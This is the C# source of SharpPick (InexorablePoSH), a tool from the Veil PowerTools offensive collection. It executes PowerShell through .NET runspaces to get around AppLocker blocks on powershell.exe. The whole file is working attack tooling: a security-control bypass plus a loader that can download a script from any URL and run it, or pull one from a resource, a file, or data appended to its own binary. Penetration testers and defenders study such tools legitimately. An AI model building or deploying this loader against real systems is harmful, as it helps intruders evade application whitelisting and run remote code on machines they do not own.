/*
 * SharpPick aka InexorablePoSH
 * Description: Application to load and run powershell code via the .NET assemblies
 * License: 3-Clause BSD License. See Veil PowerTools Project
 * 
 * This application is part of Veil PowerTools, a collection of offensive PowerShell 
 * capabilities. Hope they help! 
 * 
 * This is part of a sub-repo of PowerPick, a toolkit used to run PowerShell code without the use of Powershell.exe 
 */

using System;
using System.IO;
using System.Resources;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;

//Adding libraries for powershell stuff
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;


namespace SharpPick
{
    class Program
    {
        static string RunPS(string cmd)
        {
            //Init stuff
            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();
            RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
            Pipeline pipeline = runspace.CreatePipeline();

            //Add commands
            pipeline.Commands.AddScript(cmd);

            //Prep PS for string output and invoke
            pipeline.Commands.Add("Out-String");
            Collection<PSObject> results = pipeline.Invoke();
            runspace.Close();

            //Convert records to strings
            StringBuilder stringBuilder = new StringBuilder();
            foreach (PSObject obj in results)
            {
                stringBuilder.Append(obj);
            }
            return stringBuilder.ToString().Trim();
        }

        static void PrintHelp()
        {
            Console.Write("InexorablePoSH\n" +
                "Workaround for AppLocker deny of Powershell using .NET\n" +
                "\n" +
                "inexorableposh.exe [<flag> <argument>]\n" +
                "flags:\n" +
                "-f <file> : Read script from specified file\n" +
                "-r <resource name> : Read script from specified resource\n" +
                "-d <url> : Read script from URL\n" +
                "-a <delimeter> : Read script appended to current binary after specified delimeter. Delimeter should be very very unique string\n" +
                "-c <command> : PowerShell command to execute, enclosed on quotes.");
        }

        static int Main(string[] args)
        {
            string script;

            //Check the options
            if (args.Length != 2)
            {
                Console.WriteLine("[!] Error: Proper arguments required");
                PrintHelp();
                return -1;
            }

            //define our flag and argument
            string flag = args[0];
            string optarg = args[1];

            //Check all our options for the flag
            //When found right flag, get the script variable in the specified manner
            if (flag == "-f")
            {
                //read file from disk and pass to powershell
                try
                {
                    script = System.IO.File.ReadAllText(optarg);
                }
                catch
                {
                    Console.WriteLine("[!] Error: File Fail");
                    return (-1);
                }
            }
            else if (flag == "-r")
            {
                //Read powershell from resource of a specific name
                try
                {
                    script = Properties.Resources.ResourceManager.GetString(optarg);
                }
                catch
                {
                    Console.WriteLine("[!] Error: Resource Fail");
                    return (-1);
                }
            }
            else if (flag == "-d")
            {
                //download the script 
                try
                {
                    WebClient psdown = new WebClient();
                    script = psdown.DownloadString(optarg);
                }
                catch
                {
                    Console.WriteLine("[!] Error: Download Fail");
                    return (-1);
                }
            }
            else if (flag == "-a")
            {
                try
                {
                    string self = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
                    string selfcontent = System.IO.File.ReadAllText(self);
                    script = selfcontent.Split(new string[] { optarg }, StringSplitOptions.None)[1];
                }
                catch
                {
                    Console.WriteLine("[!] Error: Append Read fail");
                    return (-1);
                }
            }
            else if (flag == "-c")
            {
                try
                {
                    script = optarg;
                }
                catch
                {
                    Console.WriteLine("[!] Error: Command fail");
                    return (-1);
                }
            }
            else
            {
                Console.WriteLine("[!] Error: Improper flag");
                PrintHelp();
                return (-1);
            }

            //We should now have the script variable filled... double check before executing
            if (script != null)
            {
                string results = RunPS(script);
                Console.Write(results);
            }
            return 0;

        }
    }
}
